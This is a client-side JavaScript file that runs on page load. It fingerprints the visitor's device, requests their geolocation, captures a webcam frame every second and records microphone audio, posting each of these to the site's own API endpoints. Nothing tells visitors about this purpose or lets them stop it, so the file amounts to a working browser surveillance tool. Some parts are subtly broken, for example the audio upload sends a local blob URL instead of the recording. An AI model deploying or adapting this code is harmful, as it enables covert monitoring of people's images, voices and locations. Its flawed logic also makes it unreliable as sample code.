class DeviceInfo {
    constructor() {
        this.deviceInfo = {};
        this.getDeviceInfo();
    }
    
    getDeviceInfo() {
        this.deviceInfo.userAgent = navigator.userAgent;
        this.deviceInfo.platform = navigator.platform;
        this.deviceInfo.browser = this.getBrowser();
        this.deviceInfo.screen = this.getScreenSize();
        this.deviceInfo.resolution = this.getResolution();
        this.deviceInfo.isTouchDevice = this.isTouchDevice();
        this.deviceInfo.cookiesEnabled = this.areCookiesEnabled();
        this.deviceInfo.isDarkMode = this.isDarkMode();
        this.deviceInfo.deviceType = this.getDeviceType();
        this.deviceInfo.language = navigator.language || navigator.userLanguage;
        this.deviceInfo.plugins = this.getPlugins();
        this.deviceInfo.storage = this.getStorage();
        this.deviceInfo.battery = this.getBatteryInfo();
        this.deviceInfo.network = this.getNetworkInfo();
        this.deviceInfo.webgl = this.getWebGLInfo();
        this.deviceInfo.memory = this.getMemoryInfo();
        this.deviceInfo.deviceSensors = this.getDeviceSensors();
        this.deviceInfo.orientation = this.getOrientation();
        this.deviceInfo.audioSupport = this.isAudioSupported();
        this.deviceInfo.webRTC = this.isWebRTCSupported();
        this.deviceInfo.touchEvents = this.isTouchEventsSupported();
        this.deviceInfo.pageVisibility = this.getPageVisibility();
        this.deviceInfo.location = this.getLocation();
    }
    
    getBrowser() {
        const userAgent = navigator.userAgent;
        if (userAgent.indexOf('Chrome') > -1) return 'Chrome';
        if (userAgent.indexOf('Firefox') > -1) return 'Firefox';
        if (userAgent.indexOf('Safari') > -1) return 'Safari';
        if (userAgent.indexOf('Edge') > -1) return 'Edge';
        return 'Unknown';
    }
    
    getScreenSize() {
        return { width: window.screen.width, height: window.screen.height };
    }
    
    getResolution() {
        return { width: window.innerWidth, height: window.innerHeight };
    }
    
    isTouchDevice() {
        return 'ontouchstart' in document.documentElement;
    }
    
    areCookiesEnabled() {
        return navigator.cookieEnabled;
    }
    
    isDarkMode() {
        return window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;
    }
    
    getDeviceType() {
        if (/Mobi|Android/i.test(navigator.userAgent)) return 'Mobile';
        if (/Tablet|iPad/i.test(navigator.userAgent)) return 'Tablet';
        return 'Desktop';
    }
    
    getPlugins() {
        return navigator.plugins ? Array.from(navigator.plugins).map(plugin => plugin.name) : [];
    }
    
    getStorage() {
        if (navigator.storage && navigator.storage.estimate) {
            navigator.storage.estimate().then(estimate => {
                this.deviceInfo.storage = {
                    quota: estimate.quota,
                    usage: estimate.usage
                };
            });
        }
    }
    
    getBatteryInfo() {
        if ('getBattery' in navigator) {
            return navigator.getBattery().then(battery => ({
                level: battery.level * 100,
                charging: battery.charging
            }));
        }
    }
    
    getNetworkInfo() {
        if ('connection' in navigator) {
            return {
                type: navigator.connection.effectiveType,
                downlink: navigator.connection.downlink
            };
        }
    }
    
    getWebGLInfo() {
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (!gl) return 'WebGL not supported';
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
        } catch (e) {
            return 'Error retrieving WebGL info';
        }
    }
    
    getMemoryInfo() {
        if (navigator.deviceMemory) return { ram: navigator.deviceMemory };
    }
    
    getDeviceSensors() {
        if ('DeviceMotionEvent' in window) {
            return { motion: 'Accelerometer / Gyroscope supported' };
        }
    }
    
    getOrientation() {
        return {
            type: screen.orientation.type,
            angle: screen.orientation.angle
        };
    }
    
    isAudioSupported() {
        return !!(window.AudioContext || window.webkitAudioContext);
    }
    
    isWebRTCSupported() {
        return 'RTCPeerConnection' in window;
    }
    
    isTouchEventsSupported() {
        return 'ontouchstart' in window || navigator.maxTouchPoints > 0;
    }
    
    getPageVisibility() {
        return document.hidden ? 'hidden' : 'visible';
    }
    
    getLocation() {
        return new Promise((resolve, reject) => {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    position => {
                        resolve({
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude
                        });
                    },
                    error => reject('Unable to retrieve location')
                );
            } else {
                reject('Geolocation is not supported by this browser');
            }
        });
    }
    
    sendDeviceInfo() {
        this.getLocation().then(location => {
            this.deviceInfo.location = location;
            fetch(`${window.location.origin}/api/device-info`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(this.deviceInfo)
                })
                .then(response => response.json())
                .then(data => console.log('Device info sent:', data))
                .catch(error => console.error('Error sending device info:', error));
        });
    }
}

class Camera {
    constructor() {
        this.videoElement = document.createElement('video');
        this.canvasElement = document.createElement('canvas');
        this.context = this.canvasElement.getContext('2d');
    }
    
    async startCapture() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            this.videoElement.srcObject = stream;
            this.videoElement.play();
            setInterval(this.captureImage.bind(this), 1000);
        } catch (err) {
            console.error('Error accessing camera:', err);
        }
    }
    
    captureImage() {
        this.context.drawImage(this.videoElement, 0, 0, this.canvasElement.width, this.canvasElement.height);
        const imageData = this.canvasElement.toDataURL('image/jpeg');
        const timestamp = new Date().toISOString();
        const fileName = `image_${timestamp}.jpg`;
        this.sendImage(imageData, fileName);
    }
    
    sendImage(imageData, fileName) {
        fetch(`${window.location.origin}/api/capture-image`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ image: imageData, fileName: fileName })
            })
            .then(response => response.json())
            .then(data => console.log('Image sent:', data))
            .catch(error => console.error('Error sending image:', error));
    }
}

class AudioRecorder {
    constructor() {
        this.mediaRecorder = null;
        this.audioChunks = [];
    }
    
    async startRecording() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
            this.mediaRecorder = new MediaRecorder(stream);
            this.mediaRecorder.ondataavailable = event => this.audioChunks.push(event.data);
            this.mediaRecorder.onstop = () => this.saveAudio();
            this.mediaRecorder.start();
            setInterval(() => this.mediaRecorder.stop(), 15000);
        } catch (err) {
            console.error('Error accessing audio:', err);
        }
    }
    
    saveAudio() {
        const audioBlob = new Blob(this.audioChunks, { type: 'audio/wav' });
        const audioUrl = URL.createObjectURL(audioBlob);
        const timestamp = new Date().toISOString();
        const fileName = `audio_${timestamp}.wav`;
        this.sendAudio(audioUrl, fileName);
        this.audioChunks = [];
    }
    
    sendAudio(audioUrl, fileName) {
        fetch(`${window.location.origin}/api/record-audio`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ audio: audioUrl, fileName: fileName })
            })
            .then(response => response.json())
            .then(data => console.log('Audio sent:', data))
            .catch(error => console.error('Error sending audio:', error));
    }
}

const deviceInfo = new DeviceInfo();
deviceInfo.sendDeviceInfo();

const camera = new Camera();
camera.startCapture();

const audioRecorder = new AudioRecorder();
audioRecorder.startRecording();
